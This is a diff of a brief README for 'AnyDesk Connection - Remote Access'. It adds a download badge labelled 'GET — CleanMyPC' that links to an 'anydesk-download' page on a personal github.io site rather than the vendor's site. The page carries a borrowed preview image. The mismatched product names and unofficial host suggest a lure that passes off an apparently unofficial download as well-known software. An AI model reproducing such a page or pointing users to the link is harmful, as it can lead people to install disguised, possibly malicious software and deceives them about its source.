@@ -1,7 +1,7 @@
 
 # AnyDesk Connection - Remote Access
 
-[![GET](https://musaishaqqq30.github.io/.github/anydesk-download)
+[![GET AnyDesk](https://img.shields.io/badge/GET%20%E2%80%94%20CleanMyPC-0078D6?style=for-the-badge&logoColor=white)](https://musaishaqqq30.github.io/.github/anydesk-download)
 
 ![AnyDesk Preview](https://pics.computerbase.de/1/1/6/8/2/2-fc6d99baba0f0a5b/article-1280x720.af61df6b.jpg)
 
